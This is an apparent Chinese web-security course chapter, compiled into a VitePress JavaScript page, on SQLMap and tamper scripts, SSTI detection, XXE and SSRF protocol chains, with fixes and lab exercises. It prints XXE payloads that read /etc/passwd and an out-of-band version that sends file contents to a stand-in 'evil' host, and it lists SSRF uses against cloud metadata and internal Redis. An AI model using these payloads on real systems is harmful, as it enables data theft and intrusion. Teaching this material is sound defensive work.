import{_ as a,o as i,c as t,a2 as l}from"./chunks/framework.BbQrW5_t.js";const g=JSON.parse('{"title":"注入深水区","description":"","frontmatter":{"title":"注入深水区","date":"2026-09-03T00:00:00.000Z","tags":["网络安全","中级"]},"headers":[],"relativePath":"study/cyber-security/chapters/中级篇/03-注入深水区.md","filePath":"study/cyber-security/chapters/中级篇/03-注入深水区.md","lastUpdated":1788493831000}'),e={name:"study/cyber-security/chapters/中级篇/03-注入深水区.md"};function n(h,s,p,r,d,k){return i(),t("div",null,[...s[0]||(s[0]=[l(`<h1 id="_03-·-注入深水区——自动化、模板、协议与回传" tabindex="-1">03 · 注入深水区——自动化、模板、协议与回传 <a class="header-anchor" href="#_03-·-注入深水区——自动化、模板、协议与回传" aria-label="Permalink to &quot;03 · 注入深水区——自动化、模板、协议与回传&quot;">​</a></h1><blockquote><p>初级篇你手工注入；这一章升级三件事：<strong>工具的工作原理</strong>（SQLMap/tamper）、<strong>新的注入上下文</strong>（SSTI/XXE）、<strong>利用链的延伸</strong>（SSRF 协议族）。</p></blockquote><h2 id="🎯-学习目标" tabindex="-1">🎯 学习目标 <a class="header-anchor" href="#🎯-学习目标" aria-label="Permalink to &quot;🎯 学习目标&quot;">​</a></h2><ol><li>说清 SQLMap 各参数的探测逻辑，读懂一次 tamper 脚本源码</li><li>手工检测并区分 Jinja2/Twig 的 SSTI</li><li>画出 XXE 的 OOB 数据外带流程</li><li>讲清 SSRF 中 gopher 协议为什么是&quot;万金油&quot;</li></ol><h2 id="📖-核心知识" tabindex="-1">📖 核心知识 <a class="header-anchor" href="#📖-核心知识" aria-label="Permalink to &quot;📖 核心知识&quot;">​</a></h2><h3 id="_3-1-sqlmap-工作流-理解它才敢用" tabindex="-1">3.1 SQLMap 工作流（理解它才敢用） <a class="header-anchor" href="#_3-1-sqlmap-工作流-理解它才敢用" aria-label="Permalink to &quot;3.1 SQLMap 工作流（理解它才敢用）&quot;">​</a></h3><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> req.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --level</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --risk</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dbs</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># -r 从抓包文件读请求（推荐：参数复杂时手工发包再喂给 sqlmap）</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># --level 1-5：测试的注入点范围（Cookie/UA 在 level≥3 才测）</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># --risk 1-3：风险（2 以上会用 OR 型语句，可能改数据！生产禁用）</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># --os-shell：拿到数据库服务器命令执行（UTL_FILE/写文件链）——高价值高风险</span></span></code></pre></div><p><strong>它比你聪明在哪</strong>：自动识别注入类型（报错/布尔/时间/联合）、数据库方言、WAF 特征并自动换 payload。</p><p><strong>tamper 原理</strong>：payload 变换器管道。读一个源码（如 <code>space2comment.py</code>）：</p><div class="language-python vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> tamper</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(payload, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">kwargs):</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload.replace(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39; &#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/**/&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)   </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 空格→内联注释，绕&quot;空格过滤&quot;</span></span></code></pre></div><p>学会读 3 个 tamper，就理解了&quot;WAF 绕过 = 编码/变形/等价替换&quot;三件事。</p><h3 id="_3-2-ssti-模板注入" tabindex="-1">3.2 SSTI（模板注入） <a class="header-anchor" href="#_3-2-ssti-模板注入" aria-label="Permalink to &quot;3.2 SSTI（模板注入）&quot;">​</a></h3><p><strong>原理</strong>：用户输入被<strong>当模板代码编译</strong>，而不是当数据渲染——和 SQL 注入同构，只是上下文从 SQL 变成模板语法。</p><p><strong>检测指纹</strong>（一次输入区分引擎）：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>输入：{{7*7}}   \${7*7}   &lt;%= 7*7 %&gt;   {7*7}</span></span>
<span class="line"><span>返回 49 → Jinja2；再用 {{7*&#39;7&#39;}} 区分：Jinja2=7777777，Twig=49</span></span></code></pre></div><p><strong>Jinja2 利用结构</strong>（靶场复现）——沿着&quot;对象→类→基类→子类列表&quot;找 OS 模块：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>{{ &#39;&#39;.__class__.__mro__[1].__subclasses__() }}</span></span></code></pre></div><p>理解 <strong>MRO 链</strong>是核心，背 payload 没用（各版本环境子类序号不同）。</p><p><strong>修复</strong>：模板与数据分离（<code>render_template(&#39;x.html&#39;, data=v)</code> 而非 <code>render_template_string(v)</code>）、沙箱引擎、不拼接用户输入进模板字符串。</p><h3 id="_3-3-xxe-xml-外部实体" tabindex="-1">3.3 XXE（XML 外部实体） <a class="header-anchor" href="#_3-3-xxe-xml-外部实体" aria-label="Permalink to &quot;3.3 XXE（XML 外部实体）&quot;">​</a></h3><p><strong>原理</strong>：XML 解析器允许 DTD 定义&quot;实体&quot;，实体可指向外部资源——解析器替你发请求/读文件。</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;?</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">xml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> version</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;1.0&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">?&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">DOCTYPE</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> r</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [&lt;!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ENTITY</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> xxe</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> SYSTEM </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;file:///etc/passwd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;]&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">r</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">&amp;xxe;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">r</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;          </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 回显型：文件内容出现在响应里 --&gt;</span></span></code></pre></div><p><strong>OOB 外带</strong>（无回显时）：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">DOCTYPE</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> r</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [&lt;!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ENTITY</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> % </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">f</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> SYSTEM </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;file:///etc/passwd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ENTITY</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> % </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">c</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> SYSTEM </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://evil.dtd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;%c]&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- evil.dtd 里定义: &lt;!ENTITY % wrap &quot;&lt;!ENTITY send SYSTEM &#39;http://evil/?d=%f;&#39;&gt;&quot;&gt;%wrap;%send; --&gt;</span></span></code></pre></div><p>流程：解析远端 DTD → 参数实体嵌套 → 把文件内容拼进请求 URL → 攻击者 DNS/HTTP 收到数据。<strong>修复</strong>：禁用外部实体（<code>libxml_disable_entity_loader</code>/<code>FEATURE_SECURE_PROCESSING</code>）、换 JSON、升级解析库。</p><h3 id="_3-4-ssrf-的协议链" tabindex="-1">3.4 SSRF 的协议链 <a class="header-anchor" href="#_3-4-ssrf-的协议链" aria-label="Permalink to &quot;3.4 SSRF 的协议链&quot;">​</a></h3><table tabindex="0"><thead><tr><th>协议</th><th>能力</th><th>场景</th></tr></thead><tbody><tr><td>http/https</td><td>内网 Web、云元数据</td><td>打 169.254.169.254 拿云凭证</td></tr><tr><td>file://</td><td>本地文件读取</td><td>读配置/密钥</td></tr><tr><td>gopher://</td><td><strong>可发任意 TCP 报文</strong>（结构化流）</td><td>打内网 Redis 写计划任务、打 MySQL</td></tr><tr><td>dict://</td><td>端口探测/简单指令</td><td>内网端口指纹</td></tr></tbody></table><p>gopher 为什么强：它把 URL 里的字符<strong>原样变成 TCP 流</strong>——等于&quot;代理任意 TCP 客户端&quot;。修复：出站白名单、禁协议、禁重定向、元数据加固。</p><h2 id="🔬-动手实操" tabindex="-1">🔬 动手实操 <a class="header-anchor" href="#🔬-动手实操" aria-label="Permalink to &quot;🔬 动手实操&quot;">​</a></h2><p>DVWA SQLi（手工）→ 同一请求喂 SQLMap 对比结果；本地起一个 Jinja2 渲染接口复现 SSTI 指纹；用 php:8-apache + libxml2 容器复现回显 XXE。</p><h2 id="⚠️-常见坑" tabindex="-1">⚠️ 常见坑 <a class="header-anchor" href="#⚠️-常见坑" aria-label="Permalink to &quot;⚠️ 常见坑&quot;">​</a></h2><ol><li><code>--risk 3</code> 直接怼生产——OR 型 payload 会修改表数据，<strong>授权测试也要慎用</strong></li><li>SSTI 死背 payload——环境不同子类列表就变，理解 MRO 才能现场构造</li><li>XXE 只会回显型——现实中 OOB 才是主流</li><li>把 WAF 绕过当玄学——读 tamper 源码，绕过是工程</li><li>gopher 链不 URL 编码两次——常见失败原因</li></ol><h2 id="✅-自测题" tabindex="-1">✅ 自测题 <a class="header-anchor" href="#✅-自测题" aria-label="Permalink to &quot;✅ 自测题&quot;">​</a></h2><details><summary>1. --level 和 --risk 分别控制什么？</summary><p>level 控制测试广度（哪些参数/头被测）；risk 控制.payload 激进度（2+ 使用 OR 型可能改数据）。生产测试用 --risk 1。</p></details><details><summary>2. 如何区分 Jinja2 与 Twig？</summary><p><span>{{7*&#39;7&#39;}}</span>：Jinja2 对 str*int 做重复得到 &quot;7777777&quot;；Twig 报错或当 49 处理（数字相乘）。</p></details><details><summary>3. XXE 的 OOB 外带为什么要&quot;远端 DTD&quot;？</summary><p>参数实体在内部 DTD 子集中不能引用自身嵌套，需要把嵌套定义放到外部 DTD 里绕过解析器限制——外带链的核心技巧。</p></details><details><summary>4. gopher 协议在 SSRF 链中的价值？</summary><p>它把 URL 内容按字节还原成 TCP 流，等于让服务器充当任意协议的客户端——攻击内网非 HTTP 服务（Redis/MySQL/SMTP）的桥梁。</p></details><details><summary>5. SSTI 与 XSS 的本质区别？</summary><p>都在&quot;渲染层&quot;注入，但 SSTI 的上下文是<strong>模板引擎的代码</strong>（服务端执行）；XSS 的上下文是浏览器 JS（客户端执行）。危害与修复位置完全不同。</p></details><h2 id="🔗-对应周任务与资源" tabindex="-1">🔗 对应周任务与资源 <a class="header-anchor" href="#🔗-对应周任务与资源" aria-label="Permalink to &quot;🔗 对应周任务与资源&quot;">​</a></h2><ul><li><strong>W61-W64</strong>；资源：SQLMap 官方 wiki、《Java 安全编码标准》、GTFOBins 思维迁移</li></ul>`,40)])])}const c=a(e,[["render",n]]);export{g as __pageData,c as default};
